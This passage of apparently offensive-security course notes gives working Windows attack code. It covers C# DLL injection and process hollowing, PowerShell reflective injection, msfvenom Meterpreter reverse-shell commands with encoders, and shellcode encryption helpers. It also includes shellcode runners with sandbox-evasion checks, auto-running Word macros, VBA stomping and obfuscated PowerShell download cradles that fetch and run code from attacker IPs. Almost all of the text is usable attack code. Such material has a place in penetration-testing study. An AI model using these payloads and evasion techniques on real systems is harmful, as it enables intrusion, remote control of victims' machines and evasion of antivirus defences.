        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {
            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dllName = dir + "\\met.dll";

            WebClient wc = new WebClient();
            wc.DownloadFile("http://192.168.45.179/met.dll", dllName);

            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            IntPtr outSize;

            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);

            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
        }
    }
}
```

## Reflective DLL Injection in PowerShell

Inject an unmanaged Meterpreter DLL into a process

```pwsh
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.179/met.dll')
$procid = (Get-Process -Name explorer).Id
# Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.45.179/Invoke-ReflectivePEInjection.ps1'))
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

## Process Hollowing in C#

```csharp
using System;
using System.Runtime.InteropServices;

namespace ProcessHollowing
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
    IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess,
    int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
        uint ProcInfoLen, ref uint retlen);

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
    [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);

            uint opthdr = e_lfanew_offset + 0x28;

            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[722] {0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, ..., 0x2f};

            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            ResumeThread(pi.hThread);
        }
    }
}
```

# Antivirus Evasion

Read the bytes of the executable, zero out the byte at offset 18867, and write the modified executable to a new file

```pwsh
$bytes  = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")
$bytes[18867] = 0
[System.IO.File]::WriteAllBytes("C:\Tools\met_mod.exe", $bytes)
```

## Bypassing Antivirus with Metasploit

```bash
msfvenom --list encoders
```

The x86/shikata_ga_nai encoder is a commonly-used polymorphic encoder that produces different output each time it is run, making it effective for signature evasion. x64/zutto_dekiru encoder borrows many techniques from shikata_ga_nai.

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x86/shikata_ga_nai -f exe -o met.exe

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x64/zutto_dekiru -f exe -o met64_zutto.exe
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.176.134 LPORT=443 -e x64/zutto_dekiru -x /home/kali/notepad.exe -f exe -o met64_notepad.exe
```

```bash
msfvenom --list encrypt
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o met64_aes.exe
```

## Bypassing Antivirus with C#

### Encrypt the shellcode

Hardcode the shellcode

```csharp
using System;
using System.Text;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp 
            byte[] buf = new byte[695] { ... };

            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
                // encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }

            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}
```

#### helper.exe

`helper.exe <Kali IP> <msfvenom-generated csharp shellcode file>`

```csharp
using System;
using System.Text;
using System.Net.Http;
using System.Text.RegularExpressions;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            // Check if a URL was provided
            if (args.Length != 2)
            {
                Console.WriteLine("Please provide the IP and filename as command-line arguments.");
                return;
            }

            string url = "http://" + args[0] + "/" + args[1];

            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Download the file content as a string directly into memory
                    string declaration = client.GetStringAsync(url).Result; // Blocking call
                    declaration = declaration.Trim();

                    // Use a regex to extract the byte values
                    //var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};");
                    var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};", RegexOptions.Singleline);

                    if (match.Success)
                    {
                        string byteValues = match.Groups[1].Value;
                        string[] hexArray = byteValues.Split(',');

                        // Create the byte array with the dynamic size based on the number of hex values
                        byte[] buf = new byte[hexArray.Length];

                        for (int i = 0; i < hexArray.Length; i++)
                        {
                            // Convert each hex string to a byte
                            buf[i] = Convert.ToByte(hexArray[i].Trim(), 16);
                        }

                        byte[] encoded = new byte[buf.Length];
                        for (int i = 0; i < buf.Length; i++)
                        {
                            //encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
                            encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
                        }

                        StringBuilder hex = new StringBuilder(encoded.Length * 2);
                        //foreach (byte b in encoded)
                        for (int i = 0; i < encoded.Length; i++)
                        {
                            if (i != encoded.Length - 1)
                                hex.AppendFormat("0x{0:x2}, ", encoded[i]);
                            else
                                hex.AppendFormat("0x{0:x2}", encoded[i]);
                        }
                        Console.WriteLine("byte[] buf = new byte[" + buf.Length + "] {" + hex.ToString() + "};");
                    }
                    else
                    {
                        Console.WriteLine("The file does not contain a valid byte array declaration.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reading file: {ex.Message}");
            }
        }
    }
}
```

#### helper.py

`python helper.py <msfvenom-generated csharp shellcode file>`

```python
import sys
import requests
import re

def main():
    # Check if the correct number of command-line arguments is provided
    if len(sys.argv) != 2:
        print("Please provide filename as command-line arguments.")
        return

    url = f"http://127.0.0.1/{sys.argv[1]}"

    try:
        # Download the file content as a string directly into memory
        response = requests.get(url)
        response.raise_for_status()  # Raise an error for bad responses
        declaration = response.text.strip()

        # Use a regex to extract the byte values
        match = re.search(r'new byte\[\d+\] \{(.*?)\};', declaration, re.DOTALL)

        if match:
            byte_values = match.group(1)
            hex_array = byte_values.split(',')

            # Create the byte array with the dynamic size based on the number of hex values
            buf = bytearray()

            for hex_value in hex_array:
                # Convert each hex string to a byte
                buf.append(int(hex_value.strip(), 16))

            # Encode the bytes
            encoded = bytearray((b ^ 0xfa) for b in buf)

            hex_representation = ', '.join(f"0x{b:02x}" for b in encoded)
            print(f"byte[] buf = new byte[{len(buf)}] {{{hex_representation}}};")
        else:
            print("The file does not contain a valid byte array declaration.")
    except Exception as ex:
        print(f"Error reading file: {ex}")

if __name__ == "__main__":
    main()
```

Hardcode the shellcode

```csharp
using System;
using System.Runtime.InteropServices;

namespace BypassingAntivirus
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);

        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            IntPtr flsindex = FlsAlloc(IntPtr.Zero);
            if (flsindex == null)
            {
                return;
            }

            byte[] buf = new byte[695] { <encrypted shellcode> };

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
                // buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

### run.exe

`run.exe <Kali IP> <encrypted csharp shellcode file>`

```csharp
using System;
using System.Runtime.InteropServices;
using System.Net.Http;
using System.Text.RegularExpressions;

namespace BypassingAntivirus
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);

        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            IntPtr flsindex = FlsAlloc(IntPtr.Zero);
            if (flsindex == null)
            {
                return;
            }

            // Check if a URL was provided
            if (args.Length != 2)
            {
                Console.WriteLine("Please provide the IP and filename as command-line arguments.");
                return;
            }

            string url = "http://" + args[0] + "/" + args[1];

            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Download the file content as a string directly into memory
                    string declaration = client.GetStringAsync(url).Result; // Blocking call
                    declaration = declaration.Trim();

                    // Use a regex to extract the byte values
                    //var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};");
                    var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};", RegexOptions.Singleline);

                    if (match.Success)
                    {
                        string byteValues = match.Groups[1].Value;
                        string[] hexArray = byteValues.Split(',');

                        // Create the byte array with the dynamic size based on the number of hex values
                        byte[] buf = new byte[hexArray.Length];

                        for (int i = 0; i < hexArray.Length; i++)
                        {
                            // Convert each hex string to a byte
                            buf[i] = Convert.ToByte(hexArray[i].Trim(), 16);
                        }

                        for (int i = 0; i < buf.Length; i++)
                        {
                            //buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
                            buf[i] = (byte)((uint)buf[i] ^ 0xfa);
                        }

                        int size = buf.Length;

                        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

                        Marshal.Copy(buf, 0, addr, size);

                        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

                        WaitForSingleObject(hThread, 0xFFFFFFFF);
                    }
                    else
                    {
                        Console.WriteLine("The file does not contain a valid byte array declaration.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reading file: {ex.Message}");
            }
        }
    }
}
```

### hol.exe

`hol.exe <Kali IP> <filename>`

```csharp
using System;
using System.Runtime.InteropServices;
using System.Net.Http;
using System.Text.RegularExpressions;

namespace BypassingAntivirus
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
    IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess,
    int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
        uint ProcInfoLen, ref uint retlen);

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
    [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            IntPtr flsindex = FlsAlloc(IntPtr.Zero);
            if (flsindex == null)
            {
                return;
            }

            // Check if a URL was provided
            if (args.Length != 2)
            {
                Console.WriteLine("Please provide the IP and filename as command-line arguments.");
                return;
            }

            string url = "http://" + args[0] + "/" + args[1];

            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Download the file content as a string directly into memory
                    string declaration = client.GetStringAsync(url).Result; // Blocking call
                    declaration = declaration.Trim();

                    // Use a regex to extract the byte values
                    //var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};");
                    var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};", RegexOptions.Singleline);

                    if (match.Success)
                    {
                        string byteValues = match.Groups[1].Value;
                        string[] hexArray = byteValues.Split(',');

                        // Create the byte array with the dynamic size based on the number of hex values
                        byte[] buf = new byte[hexArray.Length];

                        for (int i = 0; i < hexArray.Length; i++)
                        {
                            // Convert each hex string to a byte
                            buf[i] = Convert.ToByte(hexArray[i].Trim(), 16);
                        }

                        for (int i = 0; i < buf.Length; i++)
                        {
                            //buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
                            buf[i] = (byte)((uint)buf[i] ^ 0xfa);
                        }

                        STARTUPINFO si = new STARTUPINFO();
                        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                        bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
                            IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

                        PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
                        uint tmp = 0;
                        IntPtr hProcess = pi.hProcess;
                        ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

                        IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

                        byte[] addrBuf = new byte[IntPtr.Size];
                        IntPtr nRead = IntPtr.Zero;
                        ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

                        IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

                        byte[] data = new byte[0x200];
                        ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

                        uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);

                        uint opthdr = e_lfanew_offset + 0x28;

                        uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

                        IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

                        WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

                        ResumeThread(pi.hThread);
                    }
                    else
                    {
                        Console.WriteLine("The file does not contain a valid byte array declaration.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reading file: {ex.Message}");
            }
        }
    }
}
```

## Bypassing Antivirus in VBA

### Encrypt the shellcode

Hardcode the shellcode

```csharp
using System;
using System.Text;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            // msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp 
            byte[] buf = new byte[695] { };

            byte[] encoded = new byte[buf.Length];

            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
                // encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            uint counter = 0;

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("{0:D}, ", b);
                counter++;
                if (counter % 50 == 0)
                {
                    hex.AppendFormat("_{0}", Environment.NewLine);
                }
            }
            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}
```

#### helper2.exe

`helper2.exe <Kali IP> <msfvenom-generated csharp shellcode file>`

```csharp
using System;
using System.Text;
using System.Net.Http;
using System.Text.RegularExpressions;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            // Check if a URL was provided
            if (args.Length != 2)
            {
                Console.WriteLine("Please provide the IP and filename as command-line arguments.");
                return;
            }

            string url = "http://" + args[0] + "/" + args[1];

            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Download the file content as a string directly into memory
                    string declaration = client.GetStringAsync(url).Result; // Blocking call
                    declaration = declaration.Trim();

                    // Use a regex to extract the byte values
                    //var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};");
                    var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};", RegexOptions.Singleline);

                    if (match.Success)
                    {
                        string byteValues = match.Groups[1].Value;
                        string[] hexArray = byteValues.Split(',');

                        // Create the byte array with the dynamic size based on the number of hex values
                        byte[] buf = new byte[hexArray.Length];

                        for (int i = 0; i < hexArray.Length; i++)
                        {
                            // Convert each hex string to a byte
                            buf[i] = Convert.ToByte(hexArray[i].Trim(), 16);
                        }

                        byte[] encoded = new byte[buf.Length];
                        for (int i = 0; i < buf.Length; i++)
                        {
                            encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
                        }

                        uint counter = 0;

                        StringBuilder hex = new StringBuilder(encoded.Length * 2);

                        foreach (byte b in encoded)
                        {
                            if (counter != encoded.Length - 1)
                                hex.AppendFormat("{0:D}, ", b);
                            else
                                hex.AppendFormat("{0:D}", b);
                            counter++;
                            if (counter % 50 == 0)
                            {
                                hex.AppendFormat("_{0}", Environment.NewLine);
                            }
                        }
                        Console.WriteLine("buf = Array(" + hex.ToString() + ")");
                    }
                    else
                    {
                        Console.WriteLine("The file does not contain a valid byte array declaration.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reading file: {ex.Message}");
            }
        }
    }
}
```

#### helper2.py

`python helper2.py <msfvenom-generated csharp shellcode file>`

```python
import sys
import requests
import re

def main():
    # Check if an IP and filename were provided
    if len(sys.argv) != 2:
        print("Please provide filename as command-line arguments.")
        return

    url = f"http://127.0.0.1/{sys.argv[1]}"

    try:
        # Download the file content as a string directly into memory
        response = requests.get(url)
        response.raise_for_status()  # Raise an error for bad responses
        declaration = response.text.strip()

        # Use a regex to extract the byte values
        match = re.search(r'new byte\[\d+\] \{(.*?)\};', declaration, re.DOTALL)

        if match:
            byte_values = match.group(1)
            hex_array = byte_values.split(',')

            # Create the byte array with the dynamic size based on the number of hex values
            buf = bytearray(int(val.strip(), 16) for val in hex_array)

            # Encode the byte values
            encoded = bytearray((b + 2) & 0xFF for b in buf)

            # Format the output
            hex_output = []
            for i, b in enumerate(encoded):
                hex_output.append(str(b))
                if (i + 1) % 50 == 0:
                    hex_output.append('_\n')
            output = "buf = Array(" + ", ".join(hex_output) + ")"
            print(output)
        else:
            print("The file does not contain a valid byte array declaration.")
    except Exception as ex:
        print(f"Error reading file: {ex}")

if __name__ == "__main__":
    main()
```

```VB
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long

    t1 = Now()
    Sleep (2000)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 2 Then
        Exit Function
    End If

    buf = Array(<encrypted shellcode>)

    For i = 0 To UBound(buf)
        buf(i) = buf(i) - 2
    Next i

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

## Stomping On Microsoft Word

### fakecode.vba

```VB
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    MsgBox ("This is a macro test")
End Sub
```

Automate the VBA Stomping process with Evil Clippy

```bat
EvilClippy.exe -s fakecode.vba Doc1.doc
```

## Hiding PowerShell Inside VBA

```VB
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim strArg As String
    strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
    Shell strArg, vbHide
End Sub
```

### Dechaining with WMI

PowerShell is running as a 64-bit process, => must update the PowerShell shellcode runner script accordingly

```VB
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
    GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub
```

### Obfuscating VBA

```VB
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim strArg As String
    strArg = StrReverse("))'txt.nur/021.911.861.291//:ptth'(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-wen((xei c- pon- ssapyb cexe- llehsrewop")

    GetObject(StrReverse(":stmgmniw")).Get(StrReverse("ssecorP_23niW")).Create strArg, Null, Null, pid
End Sub
```

Reduce the number of times StrReverse appears in our code

```VB
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Function bears(cows)
    bears = StrReverse(cows)
End Function

Sub MyMacro()
    Dim strArg As String
    strArg = bears("))'txt.nur/021.911.861.291//:ptth'(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-wen((xei c- pon- ssapyb cexe- llehsrewop")

    GetObject(bears(":stmgmniw")).Get(bears("ssecorP_23niW")).Create strArg, Null, Null, pid
End Sub
```

Perform a more complex obfuscation by converting the ASCII string to its decimal representation and then performing a Caesar cipher encryption on the result

```pwsh
$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"

# $payload = "winmgmts:"

